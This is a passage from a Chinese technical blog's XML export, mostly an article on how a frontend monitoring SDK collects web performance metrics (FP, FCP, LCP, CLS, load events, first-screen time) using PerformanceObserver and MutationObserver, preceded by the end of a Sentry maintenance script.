class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">docker <span class="built_in">exec</span> -i sentry_worker_1 sentry cleanup --days 60 &amp;&amp;</span><br><span class="line">docker <span class="built_in">exec</span> -i -u postgres sentry_onpremise_postgres_1 vacuumdb -U postgres -d postgres -v -f --analyze</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端监控 SDK 的一些技术要点原理分析</title>
      <link href="/2023/06/28/frontend/monitor/qian-duan-jian-kong-sdk-de-yi-xie-ji-zhu-yao-dian-yuan-li-fen-xi/"/>
      <url>/2023/06/28/frontend/monitor/qian-duan-jian-kong-sdk-de-yi-xie-ji-zhu-yao-dian-yuan-li-fen-xi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>一个完整的前端监控平台包括三个部分：数据采集与上报、数据整理和存储、数据展示。<br />本文要讲的就是其中的第一个环节——数据采集与上报。下图是本文要讲述内容的大纲，大家可以先大致了解一下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142088-268849ae-1045-471d-8715-dff44a969954.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142088-268849ae-1045-471d-8715-dff44a969954.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif">，可以用它来写一些简单的 DEMO，帮助加深理解。再结合本文一起阅读，效果更好。<br><a name="o11zp"></a></p><h2 id="性能数据采集"><a href="#性能数据采集" class="headerlink" title="性能数据采集"></a>性能数据采集</h2><p>chrome 开发团队提出了一系列用于检测网页性能的指标：</p><ul><li>FP(first-paint)，从页面加载开始到第一个像素绘制到屏幕上的时间</li><li>FCP(first-contentful-paint)，从页面加载开始到页面内容的任何部分在屏幕上完成渲染的时间</li><li>LCP(largest-contentful-paint)，从页面加载开始到最大文本块或图像元素在屏幕上完成渲染的时间</li><li>CLS(layout-shift)，从页面加载开始和其<a href="https://link.juejin.cn/?target=https://developers.google.com/web/updates/2018/07/page-lifecycle-api">生命周期状态</a>变为隐藏期间发生的所有意外布局偏移的累积分数</li></ul><p>这四个性能指标都需要通过 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceObserver">PerformanceObserver</a> 来获取（也可以通过 performance.getEntriesByName() 获取，但它不是在事件触发时通知的）。PerformanceObserver 是一个性能监测对象，用于监测性能度量事件。<br><a name="pQODz"></a></p><h3 id="FP"><a href="#FP" class="headerlink" title="FP"></a>FP</h3><p>FP(first-paint)，从页面加载开始到第一个像素绘制到屏幕上的时间。其实把 FP 理解成白屏时间也是没问题的。<br />测量代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.<span class="property">name</span> === <span class="string">&quot;first-paint&quot;</span>) &#123;</span><br><span class="line">      observer.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line"><span class="comment">// buffered 属性表示是否观察缓存数据，也就是说观察代码添加时机比事情触发时机晚也没关系。</span></span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;paint&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>通过以上代码可以得到 FP 的内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">entryType</span>: <span class="string">&quot;paint&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;first-paint&quot;</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="number">359</span>, <span class="comment">// fp 时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 startTime 就是我们要的绘制时间。<br><a name="EoHX8"></a></p><h3 id="FCP"><a href="#FCP" class="headerlink" title="FCP"></a>FCP</h3><p>FCP(first-contentful-paint)，从页面加载开始到页面内容的任何部分在屏幕上完成渲染的时间。对于该指标，”内容”指的是文本、图像（包括背景图像）、<svg>元素或非白色的<canvas>元素。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142180-f2cde2e9-9ca2-4d80-8713-10b88bc3285e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142180-f2cde2e9-9ca2-4d80-8713-10b88bc3285e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />测量代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.<span class="property">name</span> === <span class="string">&quot;first-contentful-paint&quot;</span>) &#123;</span><br><span class="line">      observer.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;paint&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>通过以上代码可以得到 FCP 的内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">entryType</span>: <span class="string">&quot;paint&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;first-contentful-paint&quot;</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="number">459</span>, <span class="comment">// fcp 时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 startTime 就是我们要的绘制时间。<br><a name="WzCiM"></a></p><h3 id="LCP"><a href="#LCP" class="headerlink" title="LCP"></a>LCP</h3><p>LCP(largest-contentful-paint)，从页面加载开始到最大文本块或图像元素在屏幕上完成渲染的时间。LCP 指标会根据页面<a href="https://link.juejin.cn/?target=https://w3c.github.io/hr-time/%23timeorigin-attribute">首次开始加载</a>的时间点来报告可视区域内可见的最大<a href="https://link.juejin.cn/?target=https://web.dev/lcp/%23what-elements-are-considered">图像或文本块</a>完成渲染的相对时间。<br />一个良好的 LCP 分数应该控制在 2.5 秒以内。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142085-b3464e1c-3470-4c48-a587-2fd3b2cb32ad.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142085-b3464e1c-3470-4c48-a587-2fd3b2cb32ad.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />测量代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (observer) &#123;</span><br><span class="line">    observer.<span class="title function_">disconnect</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;largest-contentful-paint&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>通过以上代码可以得到 LCP 的内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">element</span>: p,</span><br><span class="line">    <span class="attr">entryType</span>: <span class="string">&quot;largest-contentful-paint&quot;</span>,</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">loadTime</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">renderTime</span>: <span class="number">1021.299</span>,</span><br><span class="line">    <span class="attr">size</span>: <span class="number">37932</span>,</span><br><span class="line">    <span class="attr">startTime</span>: <span class="number">1021.299</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 startTime 就是我们要的绘制时间。element 是指 LCP 绘制的 DOM 元素。<br />FCP 和 LCP 的区别是：FCP 只要任意内容绘制完成就触发，LCP 是最大内容渲染完成时触发。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142459-f307ad02-d85c-4b68-8501-616e8cffdbd6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142459-f307ad02-d85c-4b68-8501-616e8cffdbd6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />LCP 考察的元素类型为：</p><ul><li><img>元素</li><li>内嵌在<svg>元素内的<image>元素</li><li><video>元素（使用封面图像）</li><li>通过<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/docs/Web/CSS/url()">url()</a>函数（而非使用<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/docs/Web/CSS/CSS_Images/Using_CSS_gradients">CSS 渐变</a>）加载的带有背景图像的元素</li><li>包含文本节点或其他行内级文本元素子元素的<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/docs/Web/HTML/Block-level_elements">块级元素</a>。<br><a name="Ry3ft"></a></li></ul><h3 id="CLS"><a href="#CLS" class="headerlink" title="CLS"></a>CLS</h3><p>CLS(layout-shift)，从页面加载开始和其<a href="https://link.juejin.cn/?target=https://developers.google.com/web/updates/2018/07/page-lifecycle-api">生命周期状态</a>变为隐藏期间发生的所有意外布局偏移的累积分数。<br />布局偏移分数的计算方式如下：<br />布局偏移分数 &#x3D; 影响分数 * 距离分数 复制代码<br /><a href="https://link.juejin.cn/?target=https://github.com/WICG/layout-instability%23Impact-Fraction">影响分数</a>测量<em>不稳定元素</em>对两帧之间的可视区域产生的影响。<br /><em>距离分数</em>指的是任何<em>不稳定元素</em>在一帧中位移的最大距离（水平或垂直）除以可视区域的最大尺寸维度（宽度或高度，以较大者为准）。<br /><strong>CLS 就是把所有布局偏移分数加起来的总和</strong>。<br />当一个 DOM 在两个渲染帧之间产生了位移，就会触发 CLS（如图所示）。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142442-f33631d8-9cb2-4659-a0d0-70657c9ed6cb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142442-f33631d8-9cb2-4659-a0d0-70657c9ed6cb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif">。<br />CLS 一共有三种计算方式：</p><ol><li>累加</li><li>取所有会话窗口的平均数</li><li>取所有会话窗口中的最大值<br><a name="bDCYd"></a></li></ol><h4 id="累加"><a href="#累加" class="headerlink" title="累加"></a>累加</h4><p>也就是把从页面加载开始的所有布局偏移分数加在一起。但是这种计算方式对生命周期长的页面不友好，页面存留时间越长，CLS 分数越高。<br><a name="Drzqw"></a></p><h4 id="取所有会话窗口的平均数"><a href="#取所有会话窗口的平均数" class="headerlink" title="取所有会话窗口的平均数"></a>取所有会话窗口的平均数</h4><p>这种计算方式不是按单个布局偏移为单位，而是以会话窗口为单位。将所有会话窗口的值相加再取平均值。但是这种计算方式也有缺点。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142820-23905bf9-6492-4566-83a5-0e49c0bfd429.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142820-23905bf9-6492-4566-83a5-0e49c0bfd429.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />从上图可以看出来，第一个会话窗口产生了比较大的 CLS 分数，第二个会话窗口产生了比较小的 CLS 分数。如果取它们的平均值来当做 CLS 分数，则根本看不出来页面的运行状况。原来页面是早期偏移多，后期偏移少，现在的平均值无法反映出这种情况。<br><a name="VYSn4"></a></p><h4 id="取所有会话窗口中的最大值"><a href="#取所有会话窗口中的最大值" class="headerlink" title="取所有会话窗口中的最大值"></a>取所有会话窗口中的最大值</h4><p>这种方式是目前最优的计算方式，每次只取所有会话窗口的最大值，用来反映页面布局偏移的最差情况。详情请看 <a href="https://link.juejin.cn/?target=https://web.dev/evolving-cls/">Evolving the CLS metric</a>。<br />下面是第三种计算方式的测量代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sessionValue = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> sessionEntries = [];</span><br><span class="line"><span class="keyword">const</span> cls = &#123;</span><br><span class="line">  <span class="attr">subType</span>: <span class="string">&quot;layout-shift&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;layout-shift&quot;</span>,</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">  <span class="attr">pageURL</span>: <span class="title function_">getPageURL</span>(),</span><br><span class="line">  <span class="attr">value</span>: <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">entryHandler</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.<span class="title function_">getEntries</span>()) &#123;</span><br><span class="line">    <span class="comment">// Only count layout shifts without recent user input.</span></span><br><span class="line">    <span class="keyword">if</span> (!entry.<span class="property">hadRecentInput</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> firstSessionEntry = sessionEntries[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">const</span> lastSessionEntry = sessionEntries[sessionEntries.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If the entry occurred less than 1 second after the previous entry and</span></span><br><span class="line">      <span class="comment">// less than 5 seconds after the first entry in the session, include the</span></span><br><span class="line">      <span class="comment">// entry in the current session. Otherwise, start a new session.</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        sessionValue &amp;&amp;</span><br><span class="line">        entry.<span class="property">startTime</span> - lastSessionEntry.<span class="property">startTime</span> &lt; <span class="number">1000</span> &amp;&amp;</span><br><span class="line">        entry.<span class="property">startTime</span> - firstSessionEntry.<span class="property">startTime</span> &lt; <span class="number">5000</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        sessionValue += entry.<span class="property">value</span>;</span><br><span class="line">        sessionEntries.<span class="title function_">push</span>(<span class="title function_">formatCLSEntry</span>(entry));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sessionValue = entry.<span class="property">value</span>;</span><br><span class="line">        sessionEntries = [<span class="title function_">formatCLSEntry</span>(entry)];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If the current session value is larger than the current CLS value,</span></span><br><span class="line">      <span class="comment">// update CLS and the entries contributing to it.</span></span><br><span class="line">      <span class="keyword">if</span> (sessionValue &gt; cls.<span class="property">value</span>) &#123;</span><br><span class="line">        cls.<span class="property">value</span> = sessionValue;</span><br><span class="line">        cls.<span class="property">entries</span> = sessionEntries;</span><br><span class="line">        cls.<span class="property">startTime</span> = performance.<span class="title function_">now</span>();</span><br><span class="line">        <span class="title function_">lazyReportCache</span>(<span class="title function_">deepCopy</span>(cls));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">PerformanceObserver</span>(entryHandler);</span><br><span class="line">observer.<span class="title function_">observe</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;layout-shift&quot;</span>, <span class="attr">buffered</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p>在看完上面的文字描述后，再看代码就好理解了。一次布局偏移的测量内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">entryType</span>: <span class="string">&quot;layout-shift&quot;</span>,</span><br><span class="line">  <span class="attr">hadRecentInput</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">lastInputTime</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">sources</span>: (<span class="number">2</span>) [<span class="title class_">LayoutShiftAttribution</span>, <span class="title class_">LayoutShiftAttribution</span>],</span><br><span class="line">  <span class="attr">startTime</span>: <span class="number">1176.199999999255</span>,</span><br><span class="line">  <span class="attr">value</span>: <span class="number">0.000005752046026677329</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中的 value 字段就是布局偏移分数。<br><a name="EYXuD"></a></p><h3 id="DOMContentLoaded、load-事件"><a href="#DOMContentLoaded、load-事件" class="headerlink" title="DOMContentLoaded、load 事件"></a>DOMContentLoaded、load 事件</h3><p>当纯 HTML 被完全加载以及解析时，DOMContentLoaded 事件会被触发，不用等待 css、img、iframe 加载完。<br />当整个页面及所有依赖资源如样式表和图片都已完成加载时，将触发 load 事件。<br />虽然这两个性能指标比较旧了，但是它们仍然能反映页面的一些情况。对于它们进行监听仍然是必要的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; lazyReportCache &#125; <span class="keyword">from</span> <span class="string">&quot;../utils/report&quot;</span>;</span><br><span class="line"></span><br><span class="line">[<span class="string">&quot;load&quot;</span>, <span class="string">&quot;DOMContentLoaded&quot;</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">type</span>) =&gt;</span> <span class="title function_">onEvent</span>(type));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onEvent</span>(<span class="params">type</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">lazyReportCache</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">      <span class="attr">subType</span>: type.<span class="title function_">toLocaleLowerCase</span>(),</span><br><span class="line">      <span class="attr">startTime</span>: performance.<span class="title function_">now</span>(),</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(type, callback, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(type, callback, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="VvDWN"></a></p><h3 id="首屏渲染时间"><a href="#首屏渲染时间" class="headerlink" title="首屏渲染时间"></a>首屏渲染时间</h3><p>大多数情况下，首屏渲染时间可以通过 load 事件获取。除了一些特殊情况，例如异步加载的图片和 DOM。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span>&#123;<span class="string">&quot; &quot;</span>&#125;</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;!-- 省略一堆代码... --&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  , <span class="number">3000</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>像这种情况就无法通过 load 事件获取首屏渲染时间了。这时我们需要通过 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/MutationObserver/MutationObserver">MutationObserver</a> 来获取首屏渲染时间。MutationObserver 在监听的 DOM 元素属性发生变化时会触发事件。<br />首屏渲染时间计算过程：</p><ol><li>利用 MutationObserver 监听 document 对象，每当 DOM 元素属性发生变更时，触发事件。</li><li>判断该 DOM 元素是否在首屏内，如果在，则在 requestAnimationFrame() 回调函数中调用 performance.now() 获取当前时间，作为它的绘制时间。</li><li>将最后一个 DOM 元素的绘制时间和首屏中所有加载的图片时间作对比，将最大值作为首屏渲染时间。<br><a name="T368a"></a></li></ol><h4 id="监听-DOM"><a href="#监听-DOM" class="headerlink" title="监听 DOM"></a>监听 DOM</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> next = <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> ? requestAnimationFrame : <span class="built_in">setTimeout</span>;</span><br><span class="line"><span class="keyword">const</span> ignoreDOMList = [<span class="string">&quot;STYLE&quot;</span>, <span class="string">&quot;SCRIPT&quot;</span>, <span class="string">&quot;LINK&quot;</span>];</span><br><span class="line"></span><br><span class="line">observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(<span class="function">(<span class="params">mutationList</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> entry = &#123;</span><br><span class="line">    <span class="attr">children</span>: [],</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> mutation <span class="keyword">of</span> mutationList) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mutation.<span class="property">addedNodes</span>.<span class="property">length</span> &amp;&amp; <span class="title function_">isInScreen</span>(mutation.<span class="property">target</span>)) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (entry.<span class="property">children</span>.<span class="property">length</span>) &#123;</span><br><span class="line">    entries.<span class="title function_">push</span>(entry);</span><br><span class="line">    <span class="title function_">next</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      entry.<span class="property">startTime</span> = performance.<span class="title 